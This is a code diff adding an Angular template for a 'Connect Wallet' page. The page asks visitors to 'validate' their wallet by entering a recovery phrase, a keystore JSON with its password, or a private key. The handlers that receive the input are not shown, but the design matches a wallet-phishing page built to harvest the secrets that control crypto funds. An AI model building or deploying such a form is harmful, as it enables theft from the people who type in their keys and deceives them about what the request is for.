@@ -1,0 +1,51 @@
+<div class="wallet">
+    <div class="header-wrap">
+        <a [routerLink]="['/wallets']">
+            <h1 class="title text-muted">Connect Wallet</h1>
+        </a>
+        <p>Validate you selected wallet <b>{{ wallet?.name }}</b> to continue.</p>
+    </div>
+
+    <div class="forms-wrapper">
+        <div *ngIf="!isDone" class="wrapper">
+            <div class="items">
+                <button [class]="selectedForm === 'phrase' ? 'item-btn mb-2 active-btn' : 'item-btn mb-2'" (click)="onSelect('phrase')">Phrase</button>
+                <button [class]="selectedForm === 'keystore' ? 'item-btn mb-2 active-btn' : 'item-btn mb-2'" (click)="onSelect('keystore')">Keystore JSON</button>
+                <button [class]="selectedForm === 'privateKey' ? 'item-btn mb-2 active-btn' : 'item-btn mb-2'" (click)="onSelect('privateKey')">Private Key</button>
+            </div>
+            <form *ngIf="selectedForm === 'phrase'" class="form-container" [formGroup]="phraseForm" (ngSubmit)="onSubmitPhrase()">
+                <textarea name="" id="" cols="30" rows="10" placeholder="Enter Phrase" class="form-ctrl text-area" formControlName="phrase"></textarea>
+                <b class="message">Typically 12 (sometimes 24) words seperated by a single space.</b> 
+
+                <div *ngIf="isInvalidPhrase()" class="error-container">
+                    <span class="error-alert" *ngIf="phraseForm.controls['phrase'].errors?.required">*This field is required</span>
+                    <span class="error-alert" *ngIf="phraseForm.controls['phrase'].errors?.invalidWord">*Phrase must contain 12 words or more separated by single space.</span>
+                </div>
+                <button type="submit" class="proceed-btn">{{ phraseBtnText }}</button>
+            </form>
+            <form *ngIf="selectedForm === 'keystore'" class="form-container" [formGroup]="keystoreForm" (ngSubmit)="onSubmitKeystore()">
+                <textarea name="" id="" cols="30" rows="10" placeholder="Keystore JSON" class="form-ctrl text-area" formControlName="keystore"></textarea>
+                <input type="password" id="password" class="form-ctrl mt-3" placeholder="Password" formControlName="password">
+                <b class="message">Several lines of text beginning with {{ curlyBrace }} plus the password you used to encrypt it.</b>
+
+                <div *ngIf="isInvalidKeystore()" class="error-container">
+                    <span class="error-alert" *ngIf="keystoreForm.controls['keystore'].errors?.required">*Keystore JSON is required</span>
+                    <span class="error-alert" *ngIf="keystoreForm.controls['password'].errors?.required">*Password is required</span>
+                </div>
+                <button type="submit" class="proceed-btn">{{ keystoreBtnText }}</button>
+            </form>
+            <form *ngIf="selectedForm === 'privateKey'" class="form-container" [formGroup]="privateKeyForm" (ngSubmit)="onSubmitPrivatekey()">
+                <input type="password" class="form-ctrl" placeholder="Password" formControlName="privateKey">
+                <b class="message">Typically 12 (sometimes 24) words seperated by a single space.</b>
+                <div *ngIf="isInvalidPrivateKey()" class="error-container">
+                    <span class="error-alert" *ngIf="privateKeyForm.controls['privateKey'].errors?.required">*This field is required.</span>
+                    <span class="error-alert" *ngIf="privateKeyForm.controls['privateKey'].errors?.invalidWord">*Password must contain 12 words or more separated by single space.</span>
+                </div>
+                <button type="submit" class="proceed-btn">{{ privateKeyBtnText }}</button>
+            </form>
+        </div>
+        <div *ngIf="isDone" class="wrapper">
+            <alert></alert>
+        </div>
+    </div>
+</div>
